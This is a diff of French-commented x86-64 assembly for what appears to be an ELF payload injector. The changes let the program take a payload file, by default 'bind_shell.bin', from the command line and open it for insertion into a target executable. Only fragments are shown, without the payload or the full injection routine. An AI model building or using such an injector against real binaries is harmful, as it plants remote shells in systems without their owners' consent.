@@ -1,7 +1,6 @@
 section .data
 	vmagicnum db 0x7f, 0x45, 0x4c, 0x46
 	nomelf db "simple", 0
-	;payload_size  pour l'instant 34
 	payload_name db "bind_shell.bin", 0
 section .bss
 	elfheader resb 64
@@ -48,7 +47,7 @@ global _start
 
 _start:
 	mov rax, [rsp]          ; Nombre d'argument argc
-    cmp rax, 2
+    cmp rax, 3
     jne erreur
 
     mov rdi, [rsp + 16]     ; argv[0] nom du fichier executé, argv[1] = nom du fichier ELF
@@ -57,7 +56,7 @@ _start:
     mov rsi, 2              ; Droit Lecture ecriture
     mov rdx, 0
     syscall
-
+	
 	cmp rax, 0
 	jl erreur
 
@@ -224,8 +223,10 @@ fin_recherche:
 
 	mov r12, rax			; R12 = offset de fin du fichier
 
+	mov rdi, [rsp + 32] 		; payload_name exemple binshell
+
 	mov rax, 2
-	mov rdi, payload_name
+	;mov rdi, payload_name
 	mov rsi, 0
 	mov rdx, 0
 	syscall		; Ouvre le payload
